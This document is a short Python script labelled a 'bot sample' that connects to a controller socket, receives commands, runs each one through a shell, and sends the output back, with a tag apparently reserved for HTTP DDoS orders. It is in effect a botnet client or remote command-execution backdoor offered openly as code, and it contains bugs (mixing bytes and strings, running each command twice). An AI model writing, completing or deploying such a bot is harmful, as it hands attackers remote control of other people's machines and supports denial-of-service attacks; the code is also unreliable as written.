#!/usr/bin/env python
#Python bot sample

import socket
import subprocess
BUFF = 4096

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1',8080))
    while True:
        print('waiting')
        data = sock.recv(BUFF)
        if data:
            print('data: ' +data.decode('utf-8'))
            p_data = data.split(':')
            my_cmd = ""+p_data[1]+""
            try:
                res = subprocess.check_output(my_cmd, shell=True)
                subprocess.call(my_cmd, shell=True)
                if 'HTTP_DDOS' not in p_data[0]:
                    sock.send(res.encode('utf-8'))
            except:
                pass

if __name__ == '__main__':
    main()
